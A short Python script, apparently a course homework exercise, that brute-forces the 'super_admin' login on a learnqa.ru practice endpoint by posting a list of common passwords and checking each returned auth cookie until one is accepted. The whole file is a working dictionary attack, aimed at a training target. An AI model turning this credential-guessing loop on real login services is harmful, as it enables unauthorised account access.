import requests


auth = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
login = "super_admin"
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
    "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin",
    "letmein", "welcome", "monkey", "1234", "sunshine", "123", "princess", "admin",
    "qwertyuiop", "654321", "superman", "asdfghjkl", "zxcvbnm", "dragon"
]
check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


for password in passwords:

    response = requests.post(auth, data={"login": login, "password": password})
    auth_cookie = response.cookies.get('auth_cookie')

    if auth_cookie:
        response_check = requests.get(check, cookies={'auth_cookie': auth_cookie})
        if response_check.text != "You are NOT authorized":
            print(f"Верный пароль: {password}")
            print(f"Ответ сервера: {response_check.text}")
            break